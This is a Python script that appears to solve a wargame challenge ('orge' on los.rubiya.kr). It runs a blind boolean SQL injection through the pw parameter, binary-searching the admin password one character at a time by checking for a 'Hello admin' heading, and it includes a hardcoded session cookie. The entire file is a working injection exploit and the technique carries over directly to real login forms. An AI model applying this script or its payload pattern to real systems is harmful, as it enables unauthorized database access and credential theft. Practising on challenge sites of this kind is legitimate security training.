import requests
from bs4 import BeautifulSoup

base_url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookies = {
    "PHPSESSID": "cave7hutcjhbn1q11s2kibe1hb"
}
query_params = {
    'pw': ''
}

def fetch_data(query, limit, length):
    results = []
    for index in range(limit):
        target_len = 1
        guessed_word = []
        while target_len < length:
            low = 33
            high = 126
            while low <= high:
                x = (low + high) // 2
                query_params['pw'] = f"'||id='admin'&&(ascii(substr(({query} limit {index},1),{target_len},1)) > {x})||'"
                response = requests.get(base_url, cookies=cookies, params=query_params)
                soup = BeautifulSoup(response.text, "html.parser")
                result = soup.find('h2', string="Hello admin")
                if result:
                    low = x + 1
                else:
                    high = x - 1

            query_params['pw'] = f"'||id='admin'&&(ascii(substr(({query} limit {index},1),{target_len},1)) = {x})||'"
            response = requests.get(base_url, cookies=cookies, params=query_params)
            soup = BeautifulSoup(response.text, "html.parser")
            result = soup.find('h2', string="Hello admin")
            if result:
                guessed_char = chr(x)
                guessed_word.append(guessed_char)
            else:
                query_params['pw'] = f"'||id='admin'&&(ascii(substr(({query} limit {index},1),{target_len},1)) = {x+1})||'"
                response = requests.get(base_url, cookies=cookies, params=query_params)
                soup = BeautifulSoup(response.text, "html.parser")
                result = soup.find('h2', string="Hello admin")
                if result:
                    guessed_char = chr(x + 1)
                else:
                    guessed_char = chr(x - 1)
                guessed_word.append(guessed_char)
            target_len += 1
        results.append(''.join(guessed_word))
        print(results)
    return results

def fetch_pw():
    query = "select pw"
    return fetch_data(query, 1, 20)

def fetch_all_data():
    return fetch_pw()

if __name__ == "__main__":
    all_data = fetch_all_data()
    print(all_data)
